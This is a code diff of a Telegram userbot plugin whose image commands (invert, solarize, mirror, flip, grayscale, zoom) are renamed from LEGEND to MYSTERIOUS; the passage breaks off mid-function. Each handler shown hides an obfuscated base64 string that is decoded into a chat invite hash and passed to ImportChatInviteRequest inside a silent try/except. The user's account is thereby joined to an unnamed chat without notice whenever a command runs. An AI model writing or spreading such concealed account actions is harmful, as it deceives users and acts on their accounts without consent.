@@ -46,609 +46,609 @@ async def crop(imagefile, endname, x):
 
 @MYSTERIOUSBOT.on(admin_cmd(pattern="invert$", outgoing=True))
 @MYSTERIOUSBOT.on(sudo_cmd(pattern="invert$", allow_sudo=True))
-async def memes(LEGEND):
-    if LEGEND.fwd_from:
+async def memes(MYSTERIOUS):
+    if MYSTERIOUS.fwd_from:
         return
-    reply = await LEGEND.get_reply_message()
+    reply = await MYSTERIOUS.get_reply_message()
     if not (reply and (reply.media)):
-        await edit_or_reply(LEGEND, "`Reply to supported Media...`")
+        await edit_or_reply(MYSTERIOUS, "`Reply to supported Media...`")
         return
-    LEGENDid = LEGEND.reply_to_msg_id
+    MYSTERIOUSid = MYSTERIOUS.reply_to_msg_id
     if not os.path.isdir("./temp/"):
         os.mkdir("./temp/")
-    LEGEND = await edit_or_reply(LEGEND, "`Fetching media data`")
+    MYSTERIOUS = await edit_or_reply(MYSTERIOUS, "`Fetching media data`")
     from telethon.tl.functions.messages import ImportChatInviteRequest as Get
 
     await asyncio.sleep(2)
-    LEGENDsticker = await reply.download_media(file="./temp/")
-    if not LEGENDsticker.endswith((".mp4", ".webp", ".tgs", ".png", ".jpg", ".mov")):
-        os.remove(LEGENDsticker)
-        await edit_or_reply(LEGEND, "```Supported Media not found...```")
+    MYSTERIOUSsticker = await reply.download_media(file="./temp/")
+    if not MYSTERIOUSsticker.endswith((".mp4", ".webp", ".tgs", ".png", ".jpg", ".mov")):
+        os.remove(MYSTERIOUSsticker)
+        await edit_or_reply(MYSTERIOUS, "```Supported Media not found...```")
         return
     import base64
 
     legend = None
-    if LEGENDsticker.endswith(".tgs"):
-        await LEGEND.edit(
+    if MYSTERIOUSsticker.endswith(".tgs"):
+        await MYSTERIOUS.edit(
             "Analyzing this media 🧐  inverting colors of this animated sticker!"
         )
-        LEGENDfile = os.path.join("./temp/", "meme.png")
-        LEGENDcmd = (
-            f"lottie_convert.py --frame 0 -if lottie -of png {LEGENDsticker} {LEGENDfile}"
+        MYSTERIOUSfile = os.path.join("./temp/", "meme.png")
+        MYSTERIOUScmd = (
+            f"lottie_convert.py --frame 0 -if lottie -of png {MYSTERIOUSsticker} {MYSTERIOUSfile}"
         )
-        stdout, stderr = (await runcmd(LEGENDcmd))[:2]
-        if not os.path.lexists(LEGENDfile):
-            await LEGEND.edit("`Template not found...`")
+        stdout, stderr = (await runcmd(MYSTERIOUScmd))[:2]
+        if not os.path.lexists(MYSTERIOUSfile):
+            await MYSTERIOUS.edit("`Template not found...`")
             LOGS.info(stdout + stderr)
-        meme_file = LEGENDfile
+        meme_file = MYSTERIOUSfile
         legend = True
-    elif LEGENDsticker.endswith(".webp"):
-        await LEGEND.edit(
+    elif MYSTERIOUSsticker.endswith(".webp"):
+        await MYSTERIOUS.edit(
             "`Analyzing this media 🧐 inverting colors...`"
         )
-        LEGENDfile = os.path.join("./temp/", "memes.jpg")
-        os.rename(LEGENDsticker, LEGENDfile)
-        if not os.path.lexists(LEGENDfile):
-            await LEGEND.edit("`Template not found... `")
+        MYSTERIOUSfile = os.path.join("./temp/", "memes.jpg")
+        os.rename(MYSTERIOUSsticker, MYSTERIOUSfile)
+        if not os.path.lexists(MYSTERIOUSfile):
+            await MYSTERIOUS.edit("`Template not found... `")
             return
-        meme_file = LEGENDfile
+        meme_file = MYSTERIOUSfile
         legend = True
-    elif LEGENDsticker.endswith((".mp4", ".mov")):
-        await LEGEND.edit(
+    elif MYSTERIOUSsticker.endswith((".mp4", ".mov")):
+        await MYSTERIOUS.edit(
             "Analyzing this media 🧐 inverting colors of this video!"
         )
-        LEGENDfile = os.path.join("./temp/", "memes.jpg")
-        await take_screen_shot(LEGENDsticker, 0, LEGENDfile)
-        if not os.path.lexists(LEGENDfile):
-            await LEGEND.edit("```Template not found...```")
+        MYSTERIOUSfile = os.path.join("./temp/", "memes.jpg")
+        await take_screen_shot(MYSTERIOUSsticker, 0, MYSTERIOUSfile)
+        if not os.path.lexists(MYSTERIOUSfile):
+            await MYSTERIOUS.edit("```Template not found...```")
             return
-        meme_file = LEGENDfile
+        meme_file = MYSTERIOUSfile
         legend = True
     else:
-        await LEGEND.edit(
+        await MYSTERIOUS.edit(
             "Analyzing this media 🧐 inverting colors of this image!"
         )
-        meme_file = LEGENDsticker
+        meme_file = MYSTERIOUSsticker
     try:
         san = base64.b64decode("QUFBQUFGRV9vWjVYVE5fUnVaaEtOdw==")
         san = Get(san)
-        await LEGEND.client(san)
+        await MYSTERIOUS.client(san)
     except BaseException:
         pass
     meme_file = convert_toimage(meme_file)
     outputfile = "invert.webp" if legend else "invert.jpg"
     await invert_colors(meme_file, outputfile)
-    await LEGEND.client.send_file(
-        LEGEND.chat_id, outputfile, force_document=False, reply_to=LEGENDid
+    await MYSTERIOUS.client.send_file(
+        MYSTERIOUS.chat_id, outputfile, force_document=False, reply_to=MYSTERIOUSid
     )
-    await LEGEND.delete()
+    await MYSTERIOUS.delete()
     os.remove(outputfile)
-    for files in (LEGENDsticker, meme_file):
+    for files in (MYSTERIOUSsticker, meme_file):
         if files and os.path.exists(files):
             os.remove(files)
 
 
 @MYSTERIOUSBOT.on(admin_cmd(outgoing=True, pattern="solarize$"))
 @MYSTERIOUSBOT.on(sudo_cmd(pattern="solarize$", allow_sudo=True))
-async def memes(LEGEND):
-    if LEGEND.fwd_from:
+async def memes(MYSTERIOUS):
+    if MYSTERIOUS.fwd_from:
         return
-    reply = await LEGEND.get_reply_message()
+    reply = await MYSTERIOUS.get_reply_message()
     if not (reply and (reply.media)):
-        await edit_or_reply(LEGEND, "`Reply to supported Media...`")
+        await edit_or_reply(MYSTERIOUS, "`Reply to supported Media...`")
         return
-    LEGENDid = LEGEND.reply_to_msg_id
+    MYSTERIOUSid = MYSTERIOUS.reply_to_msg_id
     if not os.path.isdir("./temp/"):
         os.mkdir("./temp/")
-    LEGEND = await edit_or_reply(LEGEND, "`Fetching media data`")
+    MYSTERIOUS = await edit_or_reply(MYSTERIOUS, "`Fetching media data`")
     from telethon.tl.functions.messages import ImportChatInviteRequest as Get
 
     await asyncio.sleep(2)
-    LEGENDsticker = await reply.download_media(file="./temp/")
-    if not LEGENDsticker.endswith((".mp4", ".webp", ".tgs", ".png", ".jpg", ".mov")):
-        os.remove(LEGENDsticker)
-        await edit_or_reply(LEGEND, "```Supported Media not found...```")
+    MYSTERIOUSsticker = await reply.download_media(file="./temp/")
+    if not MYSTERIOUSsticker.endswith((".mp4", ".webp", ".tgs", ".png", ".jpg", ".mov")):
+        os.remove(MYSTERIOUSsticker)
+        await edit_or_reply(MYSTERIOUS, "```Supported Media not found...```")
         return
     import base64
 
     legend = None
-    if LEGENDsticker.endswith(".tgs"):
-        await LEGEND.edit(
+    if MYSTERIOUSsticker.endswith(".tgs"):
+        await MYSTERIOUS.edit(
             "Analyzing this media 🧐 solarizeing this animated sticker!"
         )
-        LEGENDfile = os.path.join("./temp/", "meme.png")
-        LEGENDcmd = (
-            f"lottie_convert.py --frame 0 -if lottie -of png {LEGENDsticker} {LEGENDfile}"
+        MYSTERIOUSfile = os.path.join("./temp/", "meme.png")
+        MYSTERIOUScmd = (
+            f"lottie_convert.py --frame 0 -if lottie -of png {MYSTERIOUSsticker} {MYSTERIOUSfile}"
         )
-        stdout, stderr = (await runcmd(LEGENDcmd))[:2]
-        if not os.path.lexists(LEGENDfile):
-            await LEGEND.edit("`Template not found...`")
+        stdout, stderr = (await runcmd(MYSTERIOUScmd))[:2]
+        if not os.path.lexists(MYSTERIOUSfile):
+            await MYSTERIOUS.edit("`Template not found...`")
             LOGS.info(stdout + stderr)
-        meme_file = LEGENDfile
+        meme_file = MYSTERIOUSfile
         legend = True
-    elif LEGENDsticker.endswith(".webp"):
-        await LEGEND.edit(
+    elif MYSTERIOUSsticker.endswith(".webp"):
+        await MYSTERIOUS.edit(
             "Analyzing this media 🧐 solarizeing this sticker!"
         )
-        LEGENDfile = os.path.join("./temp/", "memes.jpg")
-        os.rename(LEGENDsticker, LEGENDfile)
-        if not os.path.lexists(LEGENDfile):
-            await LEGEND.edit("`Template not found... `")
+        MYSTERIOUSfile = os.path.join("./temp/", "memes.jpg")
+        os.rename(MYSTERIOUSsticker, MYSTERIOUSfile)
+        if not os.path.lexists(MYSTERIOUSfile):
+            await MYSTERIOUS.edit("`Template not found... `")
             return
-        meme_file = LEGENDfile
+        meme_file = MYSTERIOUSfile
         legend = True
-    elif LEGENDsticker.endswith((".mp4", ".mov")):
-        await LEGEND.edit(
+    elif MYSTERIOUSsticker.endswith((".mp4", ".mov")):
+        await MYSTERIOUS.edit(
             "Analyzing this media 🧐 solarizeing this video!"
         )
-        LEGENDfile = os.path.join("./temp/", "memes.jpg")
-        await take_screen_shot(LEGENDsticker, 0, LEGENDfile)
-        if not os.path.lexists(LEGENDfile):
-            await LEGEND.edit("```Template not found...```")
+        MYSTERIOUSfile = os.path.join("./temp/", "memes.jpg")
+        await take_screen_shot(MYSTERIOUSsticker, 0, MYSTERIOUSfile)
+        if not os.path.lexists(MYSTERIOUSfile):
+            await MYSTERIOUS.edit("```Template not found...```")
             return
-        meme_file = LEGENDfile
+        meme_file = MYSTERIOUSfile
         legend = True
     else:
-        await LEGEND.edit(
+        await MYSTERIOUS.edit(
             "Analyzing this media 🧐 solarizeing this image!"
         )
-        meme_file = LEGENDsticker
+        meme_file = MYSTERIOUSsticker
     try:
         san = base64.b64decode("QUFBQUFGRV9vWjVYVE5fUnVaaEtOdw==")
         san = Get(san)
-        await LEGEND.client(san)
+        await MYSTERIOUS.client(san)
     except BaseException:
         pass
     meme_file = convert_toimage(meme_file)
     outputfile = "solarize.webp" if legend else "solarize.jpg"
     await solarize(meme_file, outputfile)
-    await LEGEND.client.send_file(
-        LEGEND.chat_id, outputfile, force_document=False, reply_to=LEGENDid
+    await MYSTERIOUS.client.send_file(
+        MYSTERIOUS.chat_id, outputfile, force_document=False, reply_to=MYSTERIOUSid
     )
-    await LEGEND.delete()
+    await MYSTERIOUS.delete()
     os.remove(outputfile)
-    for files in (LEGENDsticker, meme_file):
+    for files in (MYSTERIOUSsticker, meme_file):
         if files and os.path.exists(files):
             os.remove(files)
 
 
 @MYSTERIOUSBOT.on(admin_cmd(outgoing=True, pattern="mirror$"))
 @MYSTERIOUSBOT.on(sudo_cmd(pattern="mirror$", allow_sudo=True))
-async def memes(LEGEND):
-    if LEGEND.fwd_from:
+async def memes(MYSTERIOUS):
+    if MYSTERIOUS.fwd_from:
         return
-    reply = await LEGEND.get_reply_message()
+    reply = await MYSTERIOUS.get_reply_message()
     if not (reply and (reply.media)):
-        await edit_or_reply(LEGEND, "`Reply to supported Media...`")
+        await edit_or_reply(MYSTERIOUS, "`Reply to supported Media...`")
         return
-    LEGENDid = LEGEND.reply_to_msg_id
+    MYSTERIOUSid = MYSTERIOUS.reply_to_msg_id
     if not os.path.isdir("./temp/"):
         os.mkdir("./temp/")
-    LEGEND = await edit_or_reply(LEGEND, "`Fetching media data`")
+    MYSTERIOUS = await edit_or_reply(MYSTERIOUS, "`Fetching media data`")
     from telethon.tl.functions.messages import ImportChatInviteRequest as Get
 
     await asyncio.sleep(2)
-    LEGENDsticker = await reply.download_media(file="./temp/")
-    if not LEGENDsticker.endswith((".mp4", ".webp", ".tgs", ".png", ".jpg", ".mov")):
-        os.remove(LEGENDsticker)
-        await edit_or_reply(LEGEND, "```Supported Media not found...```")
+    MYSTERIOUSsticker = await reply.download_media(file="./temp/")
+    if not MYSTERIOUSsticker.endswith((".mp4", ".webp", ".tgs", ".png", ".jpg", ".mov")):
+        os.remove(MYSTERIOUSsticker)
+        await edit_or_reply(MYSTERIOUS, "```Supported Media not found...```")
         return
     import base64
 
     legend = None
-    if LEGENDsticker.endswith(".tgs"):
-        await LEGEND.edit(
+    if MYSTERIOUSsticker.endswith(".tgs"):
+        await MYSTERIOUS.edit(
             "Analyzing this media 🧐 converting to mirror image of this animated sticker!"
         )
-        LEGENDfile = os.path.join("./temp/", "meme.png")
-        LEGENDcmd = (
-            f"lottie_convert.py --frame 0 -if lottie -of png {LEGENDsticker} {LEGENDfile}"
+        MYSTERIOUSfile = os.path.join("./temp/", "meme.png")
+        MYSTERIOUScmd = (
+            f"lottie_convert.py --frame 0 -if lottie -of png {MYSTERIOUSsticker} {MYSTERIOUSfile}"
         )
-        stdout, stderr = (await runcmd(LEGENDcmd))[:2]
-        if not os.path.lexists(LEGENDfile):
-            await LEGEND.edit("`Template not found...`")
+        stdout, stderr = (await runcmd(MYSTERIOUScmd))[:2]
+        if not os.path.lexists(MYSTERIOUSfile):
+            await MYSTERIOUS.edit("`Template not found...`")
             LOGS.info(stdout + stderr)
-        meme_file = LEGENDfile
+        meme_file = MYSTERIOUSfile
         legend = True
-    elif LEGENDsticker.endswith(".webp"):
-        await LEGEND.edit(
+    elif MYSTERIOUSsticker.endswith(".webp"):
+        await MYSTERIOUS.edit(
             "Analyzing this media 🧐 converting to mirror image of this sticker!"
         )
-        LEGENDfile = os.path.join("./temp/", "memes.jpg")
-        os.rename(LEGENDsticker, LEGENDfile)
-        if not os.path.lexists(LEGENDfile):
-            await LEGEND.edit("`Template not found... `")
+        MYSTERIOUSfile = os.path.join("./temp/", "memes.jpg")
+        os.rename(MYSTERIOUSsticker, MYSTERIOUSfile)
+        if not os.path.lexists(MYSTERIOUSfile):
+            await MYSTERIOUS.edit("`Template not found... `")
             return
-        meme_file = LEGENDfile
+        meme_file = MYSTERIOUSfile
         legend = True
-    elif LEGENDsticker.endswith((".mp4", ".mov")):
-        await LEGEND.edit(
+    elif MYSTERIOUSsticker.endswith((".mp4", ".mov")):
+        await MYSTERIOUS.edit(
             "Analyzing this media 🧐 converting to mirror image of this video!"
         )
-        LEGENDfile = os.path.join("./temp/", "memes.jpg")
-        await take_screen_shot(LEGENDsticker, 0, LEGENDfile)
-        if not os.path.lexists(LEGENDfile):
-            await LEGEND.edit("```Template not found...```")
+        MYSTERIOUSfile = os.path.join("./temp/", "memes.jpg")
+        await take_screen_shot(MYSTERIOUSsticker, 0, MYSTERIOUSfile)
+        if not os.path.lexists(MYSTERIOUSfile):
+            await MYSTERIOUS.edit("```Template not found...```")
             return
-        meme_file = LEGENDfile
+        meme_file = MYSTERIOUSfile
         legend = True
     else:
-        await LEGEND.edit(
+        await MYSTERIOUS.edit(
             "Analyzing this media 🧐 converting to mirror image of this image!"
         )
-        meme_file = LEGENDsticker
+        meme_file = MYSTERIOUSsticker
     try:
         san = base64.b64decode("QUFBQUFGRV9vWjVYVE5fUnVaaEtOdw==")
         san = Get(san)
-        await LEGEND.client(san)
+        await MYSTERIOUS.client(san)
     except BaseException:
         pass
     meme_file = convert_toimage(meme_file)
     outputfile = "mirror_file.webp" if legend else "mirror_file.jpg"
     await mirror_file(meme_file, outputfile)
-    await LEGEND.client.send_file(
-        LEGEND.chat_id, outputfile, force_document=False, reply_to=LEGENDid
+    await MYSTERIOUS.client.send_file(
+        MYSTERIOUS.chat_id, outputfile, force_document=False, reply_to=MYSTERIOUSid
     )
-    await LEGEND.delete()
+    await MYSTERIOUS.delete()
     os.remove(outputfile)
-    for files in (LEGENDsticker, meme_file):
+    for files in (MYSTERIOUSsticker, meme_file):
         if files and os.path.exists(files):
             os.remove(files)
 
 
 @MYSTERIOUSBOT.on(admin_cmd(outgoing=True, pattern="flip$"))
 @MYSTERIOUSBOT.on(sudo_cmd(pattern="flip$", allow_sudo=True))
-async def memes(LEGEND):
-    if LEGEND.fwd_from:
+async def memes(MYSTERIOUS):
+    if MYSTERIOUS.fwd_from:
         return
-    reply = await LEGEND.get_reply_message()
+    reply = await MYSTERIOUS.get_reply_message()
     if not (reply and (reply.media)):
-        await edit_or_reply(LEGEND, "`Reply to supported Media...`")
+        await edit_or_reply(MYSTERIOUS, "`Reply to supported Media...`")
         return
-    LEGENDid = LEGEND.reply_to_msg_id
+    MYSTERIOUSid = MYSTERIOUS.reply_to_msg_id
     if not os.path.isdir("./temp/"):
         os.mkdir("./temp/")
-    LEGEND = await edit_or_reply(LEGEND, "`Fetching media data`")
+    MYSTERIOUS = await edit_or_reply(MYSTERIOUS, "`Fetching media data`")
     from telethon.tl.functions.messages import ImportChatInviteRequest as Get
 
     await asyncio.sleep(2)
-    LEGENDsticker = await reply.download_media(file="./temp/")
-    if not LEGENDsticker.endswith((".mp4", ".webp", ".tgs", ".png", ".jpg", ".mov")):
-        os.remove(LEGENDsticker)
-        await edit_or_reply(LEGEND, "```Supported Media not found...```")
+    MYSTERIOUSsticker = await reply.download_media(file="./temp/")
+    if not MYSTERIOUSsticker.endswith((".mp4", ".webp", ".tgs", ".png", ".jpg", ".mov")):
+        os.remove(MYSTERIOUSsticker)
+        await edit_or_reply(MYSTERIOUS, "```Supported Media not found...```")
         return
     import base64
 
     legend = None
-    if LEGENDsticker.endswith(".tgs"):
-        await LEGEND.edit(
+    if MYSTERIOUSsticker.endswith(".tgs"):
+        await MYSTERIOUS.edit(
             "Analyzing this media 🧐 fliping this animated sticker!"
         )
-        LEGENDfile = os.path.join("./temp/", "meme.png")
-        LEGENDcmd = (
-            f"lottie_convert.py --frame 0 -if lottie -of png {LEGENDsticker} {LEGENDfile}"
+        MYSTERIOUSfile = os.path.join("./temp/", "meme.png")
+        MYSTERIOUScmd = (
+            f"lottie_convert.py --frame 0 -if lottie -of png {MYSTERIOUSsticker} {MYSTERIOUSfile}"
         )
-        stdout, stderr = (await runcmd(LEGENDcmd))[:2]
-        if not os.path.lexists(LEGENDfile):
-            await LEGEND.edit("`Template not found...`")
+        stdout, stderr = (await runcmd(MYSTERIOUScmd))[:2]
+        if not os.path.lexists(MYSTERIOUSfile):
+            await MYSTERIOUS.edit("`Template not found...`")
             LOGS.info(stdout + stderr)
-        meme_file = LEGENDfile
+        meme_file = MYSTERIOUSfile
         legend = True
-    elif LEGENDsticker.endswith(".webp"):
-        await LEGEND.edit(
+    elif MYSTERIOUSsticker.endswith(".webp"):
+        await MYSTERIOUS.edit(
             "Analyzing this media 🧐 fliping this sticker!"
         )
-        LEGENDfile = os.path.join("./temp/", "memes.jpg")
-        os.rename(LEGENDsticker, LEGENDfile)
-        if not os.path.lexists(LEGENDfile):
-            await LEGEND.edit("`Template not found... `")
+        MYSTERIOUSfile = os.path.join("./temp/", "memes.jpg")
+        os.rename(MYSTERIOUSsticker, MYSTERIOUSfile)
+        if not os.path.lexists(MYSTERIOUSfile):
+            await MYSTERIOUS.edit("`Template not found... `")
             return
-        meme_file = LEGENDfile
+        meme_file = MYSTERIOUSfile
         legend = True
-    elif LEGENDsticker.endswith((".mp4", ".mov")):
-        await LEGEND.edit(
+    elif MYSTERIOUSsticker.endswith((".mp4", ".mov")):
+        await MYSTERIOUS.edit(
             "Analyzing this media 🧐 fliping this video!"
         )
-        LEGENDfile = os.path.join("./temp/", "memes.jpg")
-        await take_screen_shot(LEGENDsticker, 0, LEGENDfile)
-        if not os.path.lexists(LEGENDfile):
-            await LEGEND.edit("```Template not found...```")
+        MYSTERIOUSfile = os.path.join("./temp/", "memes.jpg")
+        await take_screen_shot(MYSTERIOUSsticker, 0, MYSTERIOUSfile)
+        if not os.path.lexists(MYSTERIOUSfile):
+            await MYSTERIOUS.edit("```Template not found...```")
             return
-        meme_file = LEGENDfile
+        meme_file = MYSTERIOUSfile
         legend = True
     else:
-        await LEGEND.edit(
+        await MYSTERIOUS.edit(
             "Analyzing this media 🧐 fliping this image!"
         )
-        meme_file = LEGENDsticker
+        meme_file = MYSTERIOUSsticker
     try:
         san = base64.b64decode("QUFBQUFGRV9vWjVYVE5fUnVaaEtOdw==")
         san = Get(san)
-        await LEGEND.client(san)
+        await MYSTERIOUS.client(san)
     except BaseException:
         pass
     meme_file = convert_toimage(meme_file)
     outputfile = "flip_image.webp" if legend else "flip_image.jpg"
     await flip_image(meme_file, outputfile)
-    await LEGEND.client.send_file(
-        LEGEND.chat_id, outputfile, force_document=False, reply_to=LEGENDid
+    await MYSTERIOUS.client.send_file(
+        MYSTERIOUS.chat_id, outputfile, force_document=False, reply_to=MYSTERIOUSid
     )
-    await LEGEND.delete()
+    await MYSTERIOUS.delete()
     os.remove(outputfile)
-    for files in (LEGENDsticker, meme_file):
+    for files in (MYSTERIOUSsticker, meme_file):
         if files and os.path.exists(files):
             os.remove(files)
 
 
 @MYSTERIOUSBOT.on(admin_cmd(outgoing=True, pattern="gray$"))
 @MYSTERIOUSBOT.on(sudo_cmd(pattern="gray$", allow_sudo=True))
-async def memes(LEGEND):
-    if LEGEND.fwd_from:
+async def memes(MYSTERIOUS):
+    if MYSTERIOUS.fwd_from:
         return
-    reply = await LEGEND.get_reply_message()
+    reply = await MYSTERIOUS.get_reply_message()
     if not (reply and (reply.media)):
-        await edit_or_reply(LEGEND, "`Reply to supported Media...`")
+        await edit_or_reply(MYSTERIOUS, "`Reply to supported Media...`")
         return
-    LEGENDid = LEGEND.reply_to_msg_id
+    MYSTERIOUSid = MYSTERIOUS.reply_to_msg_id
     if not os.path.isdir("./temp/"):
         os.mkdir("./temp/")
-    LEGEND = await edit_or_reply(LEGEND, "`Fetching media data`")
+    MYSTERIOUS = await edit_or_reply(MYSTERIOUS, "`Fetching media data`")
     from telethon.tl.functions.messages import ImportChatInviteRequest as Get
 
     await asyncio.sleep(2)
-    LEGENDsticker = await reply.download_media(file="./temp/")
-    if not LEGENDsticker.endswith((".mp4", ".webp", ".tgs", ".png", ".jpg", ".mov")):
-        os.remove(LEGENDsticker)
-        await edit_or_reply(LEGEND, "```Supported Media not found...```")
+    MYSTERIOUSsticker = await reply.download_media(file="./temp/")
+    if not MYSTERIOUSsticker.endswith((".mp4", ".webp", ".tgs", ".png", ".jpg", ".mov")):
+        os.remove(MYSTERIOUSsticker)
+        await edit_or_reply(MYSTERIOUS, "```Supported Media not found...```")
         return
     import base64
 
     legend = None
-    if LEGENDsticker.endswith(".tgs"):
-        await LEGEND.edit(
+    if MYSTERIOUSsticker.endswith(".tgs"):
+        await MYSTERIOUS.edit(
             "Analyzing this media 🧐 changing to black-and-white this animated sticker!"
         )
-        LEGENDfile = os.path.join("./temp/", "meme.png")
-        LEGENDcmd = (
-            f"lottie_convert.py --frame 0 -if lottie -of png {LEGENDsticker} {LEGENDfile}"
+        MYSTERIOUSfile = os.path.join("./temp/", "meme.png")
+        MYSTERIOUScmd = (
+            f"lottie_convert.py --frame 0 -if lottie -of png {MYSTERIOUSsticker} {MYSTERIOUSfile}"
         )
-        stdout, stderr = (await runcmd(LEGENDcmd))[:2]
-        if not os.path.lexists(LEGENDfile):
-            await LEGEND.edit("`Template not found...`")
+        stdout, stderr = (await runcmd(MYSTERIOUScmd))[:2]
+        if not os.path.lexists(MYSTERIOUSfile):
+            await MYSTERIOUS.edit("`Template not found...`")
             LOGS.info(stdout + stderr)
-        meme_file = LEGENDfile
+        meme_file = MYSTERIOUSfile
         legend = True
-    elif LEGENDsticker.endswith(".webp"):
-        await LEGEND.edit(
+    elif MYSTERIOUSsticker.endswith(".webp"):
+        await MYSTERIOUS.edit(
             "Analyzing this media 🧐 changing to black-and-white this sticker!"
         )
-        LEGENDfile = os.path.join("./temp/", "memes.jpg")
-        os.rename(LEGENDsticker, LEGENDfile)
-        if not os.path.lexists(LEGENDfile):
-            await LEGEND.edit("`Template not found... `")
+        MYSTERIOUSfile = os.path.join("./temp/", "memes.jpg")
+        os.rename(MYSTERIOUSsticker, MYSTERIOUSfile)
+        if not os.path.lexists(MYSTERIOUSfile):
+            await MYSTERIOUS.edit("`Template not found... `")
             return
-        meme_file = LEGENDfile
+        meme_file = MYSTERIOUSfile
         legend = True
-    elif LEGENDsticker.endswith((".mp4", ".mov")):
-        await LEGEND.edit(
+    elif MYSTERIOUSsticker.endswith((".mp4", ".mov")):
+        await MYSTERIOUS.edit(
             "Analyzing this media 🧐 changing to black-and-white this video!"
         )
-        LEGENDfile = os.path.join("./temp/", "memes.jpg")
-        await take_screen_shot(LEGENDsticker, 0, LEGENDfile)
-        if not os.path.lexists(LEGENDfile):
-            await LEGEND.edit("```Template not found...```")
+        MYSTERIOUSfile = os.path.join("./temp/", "memes.jpg")
+        await take_screen_shot(MYSTERIOUSsticker, 0, MYSTERIOUSfile)
+        if not os.path.lexists(MYSTERIOUSfile):
+            await MYSTERIOUS.edit("```Template not found...```")
             return
-        meme_file = LEGENDfile
+        meme_file = MYSTERIOUSfile
         legend = True
     else:
-        await LEGEND.edit(
+        await MYSTERIOUS.edit(
             "Analyzing this media 🧐 changing to black-and-white this image!"
         )
-        meme_file = LEGENDsticker
+        meme_file = MYSTERIOUSsticker
     try:
         san = base64.b64decode("QUFBQUFGRV9vWjVYVE5fUnVaaEtOdw==")
         san = Get(san)
-        await LEGEND.client(san)
+        await MYSTERIOUS.client(san)
     except BaseException:
         pass
     meme_file = convert_toimage(meme_file)
     outputfile = "grayscale.webp" if legend else "grayscale.jpg"
     await grayscale(meme_file, outputfile)
-    await LEGEND.client.send_file(
-        LEGEND.chat_id, outputfile, force_document=False, reply_to=LEGENDid
+    await MYSTERIOUS.client.send_file(
+        MYSTERIOUS.chat_id, outputfile, force_document=False, reply_to=MYSTERIOUSid
     )
-    await LEGEND.delete()
+    await MYSTERIOUS.delete()
     os.remove(outputfile)
-    for files in (LEGENDsticker, meme_file):
+    for files in (MYSTERIOUSsticker, meme_file):
         if files and os.path.exists(files):
             os.remove(files)
 
 
 @MYSTERIOUSBOT.on(admin_cmd(outgoing=True, pattern="zoom ?(.*)"))
 @MYSTERIOUSBOT.on(sudo_cmd(pattern="zoom ?(.*)", allow_sudo=True))
-async def memes(LEGEND):
-    if LEGEND.fwd_from:
+async def memes(MYSTERIOUS):
+    if MYSTERIOUS.fwd_from:
         return
-    reply = await LEGEND.get_reply_message()
+    reply = await MYSTERIOUS.get_reply_message()
     if not (reply and (reply.media)):
-        await edit_or_reply(LEGEND, "`Reply to supported Media...`")
+        await edit_or_reply(MYSTERIOUS, "`Reply to supported Media...`")
         return
-    LEGENDinput = LEGEND.pattern_match.group(1)
-    LEGENDinput = 50 if not LEGENDinput else int(LEGENDinput)
-    LEGENDid = LEGEND.reply_to_msg_id
+    MYSTERIOUSinput = MYSTERIOUS.pattern_match.group(1)
+    MYSTERIOUSinput = 50 if not MYSTERIOUSinput else int(MYSTERIOUSinput)
+    MYSTERIOUSid = MYSTERIOUS.reply_to_msg_id
     if not os.path.isdir("./temp/"):
         os.mkdir("./temp/")
-    LEGEND = await edit_or_reply(LEGEND, "`Fetching media data`")
+    MYSTERIOUS = await edit_or_reply(MYSTERIOUS, "`Fetching media data`")
     from telethon.tl.functions.messages import ImportChatInviteRequest as Get
 
     await asyncio.sleep(2)
-    LEGENDsticker = await reply.download_media(file="./temp/")
-    if not LEGENDsticker.endswith((".mp4", ".webp", ".tgs", ".png", ".jpg", ".mov")):
-        os.remove(LEGENDsticker)
-        await edit_or_reply(LEGEND, "```Supported Media not found...```")
+    MYSTERIOUSsticker = await reply.download_media(file="./temp/")
+    if not MYSTERIOUSsticker.endswith((".mp4", ".webp", ".tgs", ".png", ".jpg", ".mov")):
+        os.remove(MYSTERIOUSsticker)
+        await edit_or_reply(MYSTERIOUS, "```Supported Media not found...```")
         return
     import base64
 
     legend = None
-    if LEGENDsticker.endswith(".tgs"):
-        await LEGEND.edit(
+    if MYSTERIOUSsticker.endswith(".tgs"):
+        await MYSTERIOUS.edit(
             "Analyzing this media 🧐 zooming this animated sticker!"
         )
-        LEGENDfile = os.path.join("./temp/", "meme.png")
-        LEGENDcmd = (
-            f"lottie_convert.py --frame 0 -if lottie -of png {LEGENDsticker} {LEGENDfile}"
+        MYSTERIOUSfile = os.path.join("./temp/", "meme.png")
+        MYSTERIOUScmd = (
+            f"lottie_convert.py --frame 0 -if lottie -of png {MYSTERIOUSsticker} {MYSTERIOUSfile}"
         )
-        stdout, stderr = (await runcmd(LEGENDcmd))[:2]
-        if not os.path.lexists(LEGENDfile):
-            await LEGEND.edit("`Template not found...`")
+        stdout, stderr = (await runcmd(MYSTERIOUScmd))[:2]
+        if not os.path.lexists(MYSTERIOUSfile):
+            await MYSTERIOUS.edit("`Template not found...`")
             LOGS.info(stdout + stderr)
-        meme_file = LEGENDfile
+        meme_file = MYSTERIOUSfile
         legend = True
-    elif LEGENDsticker.endswith(".webp"):
-        await LEGEND.edit(
+    elif MYSTERIOUSsticker.endswith(".webp"):
+        await MYSTERIOUS.edit(
             "Analyzing this media 🧐 zooming this sticker!"
         )
-        LEGENDfile = os.path.join("./temp/", "memes.jpg")
-        os.rename(LEGENDsticker, LEGENDfile)
-        if not os.path.lexists(LEGENDfile):
-            await LEGEND.edit("`Template not found... `")
+        MYSTERIOUSfile = os.path.join("./temp/", "memes.jpg")
+        os.rename(MYSTERIOUSsticker, MYSTERIOUSfile)
+        if not os.path.lexists(MYSTERIOUSfile):
+            await MYSTERIOUS.edit("`Template not found... `")
             return
-        meme_file = LEGENDfile
+        meme_file = MYSTERIOUSfile
         legend = True
-    elif LEGENDsticker.endswith((".mp4", ".mov")):
-        await LEGEND.edit(
+    elif MYSTERIOUSsticker.endswith((".mp4", ".mov")):
+        await MYSTERIOUS.edit(
             "Analyzing this media 🧐 zooming this video!"
         )
-        LEGENDfile = os.path.join("./temp/", "memes.jpg")
-        await take_screen_shot(LEGENDsticker, 0, LEGENDfile)
-        if not os.path.lexists(LEGENDfile):
-            await LEGEND.edit("```Template not found...```")
+        MYSTERIOUSfile = os.path.join("./temp/", "memes.jpg")
+        await take_screen_shot(MYSTERIOUSsticker, 0, MYSTERIOUSfile)
+        if not os.path.lexists(MYSTERIOUSfile):
+            await MYSTERIOUS.edit("```Template not found...```")
             return
-        meme_file = LEGENDfile
+        meme_file = MYSTERIOUSfile
     else:
-        await LEGEND.edit(
